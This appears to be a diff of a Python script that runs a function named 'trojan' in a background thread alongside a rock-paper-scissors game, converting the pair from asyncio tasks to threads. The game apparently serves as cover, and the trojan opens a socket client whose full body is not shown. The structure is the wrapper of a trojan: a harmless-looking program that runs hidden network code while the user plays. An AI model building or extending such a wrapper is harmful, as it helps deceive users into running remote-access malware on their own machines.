@@ -1,9 +1,9 @@
 import os
 import random
-import asyncio
 import socket
+import threading
 
-async def trojan():
+def trojan():
     # Create a socket object
     client = socket.socket()
 
@@ -44,7 +44,7 @@ async def trojan():
 
 # A game stolen from my other project
 # RockPaperScissors.py
-async def game():
+def game():
     def num2choice(num):
         if num == 1:
             return "Rock"
@@ -109,15 +109,18 @@ async def game():
     elif win == loss:
         print("The Tournament Resulted In A Draw!")
 
-async def main():
-    # Create task objects for each function
-    trojan_task = asyncio.create_task(trojan())
-    game_task = asyncio.create_task(game())
+def main():
+    # Create thread objects for each function
+    trojan_thread = threading.Thread(target=trojan)
+    game_thread = threading.Thread(target=game)
 
-    # Wait for the tasks to complete
-    await asyncio.gather(trojan_task, game_task)
+    # Start the threads
+    trojan_thread.start()
+    game_thread.start()
 
-    print("Done!")
+    # Wait for the threads to complete
+    trojan_thread.join()
+    game_thread.join()
 
 if __name__ == '__main__':
-    asyncio.run(main())
+    main()
